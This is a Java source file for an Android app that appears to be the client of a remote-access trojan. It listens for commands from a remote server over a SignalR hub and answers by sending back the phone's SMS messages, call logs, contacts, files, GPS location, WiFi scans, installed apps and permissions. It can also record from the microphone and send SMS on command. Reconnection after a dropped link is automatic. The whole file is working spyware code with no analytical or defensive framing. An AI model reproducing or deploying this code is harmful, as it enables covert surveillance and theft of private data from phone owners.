package com.remote.app;

import android.content.Context;
import android.os.Looper;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.util.Log;

import com.microsoft.signalr.HubConnection;

import org.json.JSONException;
import org.json.JSONObject;

import io.reactivex.CompletableObserver;
import io.reactivex.disposables.Disposable;
import io.socket.emitter.Emitter;

public class ConnectionManager {


    public static Context context;
    private static HubConnection ioSocket;

    public static void startAsync(Context con) {
        try {
            context = con;
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }

    }

    public static void sendReq() {
        try {
            if (ioSocket != null)
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();

            ioSocket.on("ping", () -> ioSocket.send("pong"));

            ioSocket.on("order", (data) -> {
            }, JSONObject.class);
            ioSocket.on("order", (data) -> {
                try {

                    String order = data.getString("type");


                    switch (order) {
//                            case "0xCA":
//                                if(data.getString("action").equals("camList"))
//                                    CA(-1);
//                                else if (data.getString("action").equals("takePic"))
//                                    CA(Integer.parseInt(data.getString("cameraID")));
//                                break;
                        case "0xFI":
                            if (data.getString("action").equals("ls"))
                                FI(0, data.getString("path"));
                            else if (data.getString("action").equals("dl"))
                                FI(1, data.getString("path"));
                            break;
                        case "0xSM":
                            if (data.getString("action").equals("ls"))
                                SM(0, null, null);
                            else if (data.getString("action").equals("sendSMS"))
                                SM(1, data.getString("to"), data.getString("sms"));
                            break;
                        case "0xCL":
                            CL();
                            break;
                        case "0xCO":
                            CO();
                            break;
                        case "0xMI":
                            MI(data.getInt("sec"));
                            break;
                        case "0xLO":
                            LO();
                            break;
                        case "0xWI":
                            WI();
                            break;
                        case "0xPM":
                            PM();
                            break;
                        case "0xIN":
                            IN();
                            break;
                        case "0xGP":
                            GP(data.getString("permission"));
                            break;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, JSONObject.class);

            ioSocket.onClosed((ex) -> {
                ioSocket.start();
            });

            ioSocket.start().subscribe(new CompletableObserver() {
                @Override
                public void onSubscribe(@NonNull Disposable d) {
                }

                @Override
                public void onError(@NonNull Throwable e) {
                    // TODO OnError
                }

                @Override
                public void onComplete() {
                    String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);


                    JSONObject obj = new JSONObject();
                    obj.put("deviceId", deviceID);
                    obj.put("release", deviceID);
                    obj.put("manufacturer", deviceID);
                    obj.put("model", deviceID);
                    obj.put("ipAddress", deviceID);

                    ioSocket.send("_0xSD", obj);
                }

            });
            ;

        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
        }

    }

//    public static void CA(int cameraID){
//        if(cameraID == -1) {
//           JSONObject cameraList = new CameraManager(context).findCameraList();
//            if(cameraList != null)
//            ioSocket.send("_0xCA" ,cameraList );
//        } else {
//            new CameraManager(context).startUp(cameraID);
//        }
//    }

    public static void FI(int req, String path) {
        if (req == 0) {
            JSONObject object = new JSONObject();
            try {
                object.put("type", "list");
                object.put("list", FileManager.walk(path));
                ioSocket.send("_0xFI", object);
            } catch (JSONException e) {
            }
        } else if (req == 1)
            FileManager.downloadFile(path);
    }


    public static void SM(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.send("_0xLM", SMSManager.getsms());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.send("_0xSM", isSent);
        }
    }

    public static void CL() {
        ioSocket.send("_0xCL", CallsManager.getCallsLogs());
    }

    public static void CO() {
        ioSocket.send("_0xCO", ContactsManager.getContacts());
    }

    public static void MI(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void WI() {
        ioSocket.send("_0xWI", WifiScanner.scan(context));
    }

    public static void PM() {
        ioSocket.send("_0xPM", PermissionManager.getGrantedPermissions());
    }


    public static void IN() {
        ioSocket.send("_0xIN", AppList.getInstalledApps(false));
    }


    public static void GP(String perm) {
        JSONObject data = new JSONObject();
        try {
            data.put("permission", perm);
            data.put("isAllowed", PermissionManager.canIUse(perm));
            ioSocket.send("_0xGP", data);
        } catch (JSONException e) {

        }
    }

    public static void LO() throws Exception {
        Looper.prepare();
        LocManager gps = new LocManager(context);
        // check if GPS enabled
        if (gps.canGetLocation()) {
            ioSocket.send("_0xLO", gps.getData());
        }
    }

}
